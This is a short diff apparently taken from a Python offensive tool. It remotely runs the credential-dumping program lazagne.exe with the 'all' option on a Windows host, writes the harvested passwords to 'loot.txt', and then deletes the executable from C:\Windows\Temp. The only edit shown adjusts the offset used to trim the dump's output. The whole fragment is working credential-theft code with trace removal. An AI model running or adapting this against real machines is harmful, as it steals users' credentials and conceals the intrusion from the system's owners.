@@ -82,7 +82,7 @@ try:
     print(f"{Fore.YELLOW}{Style.BRIGHT}[!]{Style.RESET_ALL} Gathering All Possible Credentials This Could Take A While")
     stdout, stderr, rc = client.run_executable("cmd",
         arguments='/c C:\\Windows\\Temp\\lazagne.exe all')
-    file = open('loot.txt','w').write((stdout.decode())[499:])
+    file = open('loot.txt','w').write((stdout.decode())[505:])
     print(f"{Fore.GREEN}{Style.BRIGHT}[+]{Style.RESET_ALL} All Gathered Credentials Written To loot.txt")
     stdout, stderr, rc = client.run_executable("cmd",
         arguments='/c del C:\\Windows\\Temp\\lazagne.exe')
